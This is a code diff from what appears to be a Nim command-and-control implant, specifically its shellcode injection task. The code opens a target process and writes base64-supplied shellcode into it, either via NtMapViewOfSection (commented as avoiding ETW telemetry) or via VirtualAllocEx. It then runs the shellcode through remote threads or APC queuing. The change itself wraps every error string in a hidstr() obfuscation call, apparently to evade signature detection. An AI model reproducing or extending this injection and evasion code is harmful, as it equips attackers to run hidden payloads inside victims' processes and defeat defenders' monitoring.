@@ -118,14 +118,14 @@ when defined(windows):
     let hThread = CreateRemoteThread(hProcess, nil, SIZE_T(0),
                                      remoteMem, nil, DWORD(0), addr threadId)
     if hThread == 0 or hThread == INVALID_HANDLE_VALUE:
-      return "Error: CreateRemoteThread failed"
+      return hidstr("Error: CreateRemoteThread failed")
     discard CloseHandle(hThread)
     return "TID " & $threadId
 
   proc injectAPC(hProcess: HANDLE, remoteMem: LPVOID, pid: DWORD): string =
     let snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, DWORD(0))
     if snap == INVALID_HANDLE_VALUE:
-      return "Error: CreateToolhelp32Snapshot failed"
+      return hidstr("Error: CreateToolhelp32Snapshot failed")
 
     var te: THREADENTRY32
     te.dwSize = DWORD(sizeof(THREADENTRY32))
@@ -144,7 +144,7 @@ when defined(windows):
 
     discard CloseHandle(snap)
     if queued == 0:
-      return "Error: no threads found in target process"
+      return hidstr("Error: no threads found in target process")
     return $queued & " APC(s) queued"
 
   proc allocMapView(hProcess: HANDLE, shellcode: seq[byte]): LPVOID =
@@ -190,10 +190,10 @@ proc injectExecute(taskId: string, params: JsonNode, state: AgentState,
     let shellcodeB64 = params{"shellcode"}.getStr("")
 
     if pid == 0:
-      return TaskResult(output: "Error: pid parameter required",
+      return TaskResult(output: hidstr("Error: pid parameter required"),
                         status: "error", completed: true)
     if shellcodeB64.len == 0:
-      return TaskResult(output: "Error: shellcode parameter required",
+      return TaskResult(output: hidstr("Error: shellcode parameter required"),
                         status: "error", completed: true)
 
     var shellcode: seq[byte]
@@ -203,16 +203,16 @@ proc injectExecute(taskId: string, params: JsonNode, state: AgentState,
       for i, c in decoded:
         shellcode[i] = byte(ord(c))
     except Exception as e:
-      return TaskResult(output: "Error decoding shellcode: " & e.msg,
+      return TaskResult(output: hidstr("Error decoding shellcode: ") & e.msg,
                         status: "error", completed: true)
 
     if shellcode.len == 0:
-      return TaskResult(output: "Error: empty shellcode",
+      return TaskResult(output: hidstr("Error: empty shellcode"),
                         status: "error", completed: true)
 
     let hProcess = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid)
     if hProcess == 0:
-      return TaskResult(output: "Error: OpenProcess failed for PID " & $pid,
+      return TaskResult(output: hidstr("Error: OpenProcess failed for PID ") & $pid,
                         status: "error", completed: true)
 
     var remoteMem: LPVOID = nil
@@ -222,20 +222,20 @@ proc injectExecute(taskId: string, params: JsonNode, state: AgentState,
       # NtCreateSection + NtMapViewOfSection — avoids VirtualAllocEx / MWTI ETW
       remoteMem = allocMapView(hProcess, shellcode)
       if remoteMem == nil:
-        allocErr = "Error: NtMapViewOfSection allocation failed"
+        allocErr = hidstr("Error: NtMapViewOfSection allocation failed")
     else:
       # Classic VirtualAllocEx path
       remoteMem = VirtualAllocEx(hProcess, nil, SIZE_T(shellcode.len),
                                  MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
       if remoteMem == nil:
-        allocErr = "Error: VirtualAllocEx failed"
+        allocErr = hidstr("Error: VirtualAllocEx failed")
       else:
         var written: SIZE_T = 0
         let wok = WriteProcessMemory(hProcess, remoteMem, addr shellcode[0],
                                      SIZE_T(shellcode.len), addr written)
         if wok == 0:
           discard CloseHandle(hProcess)
-          return TaskResult(output: "Error: WriteProcessMemory failed",
+          return TaskResult(output: hidstr("Error: WriteProcessMemory failed"),
                             status: "error", completed: true)
         var oldProtect: DWORD = 0
         discard VirtualProtectEx(hProcess, remoteMem, SIZE_T(shellcode.len),
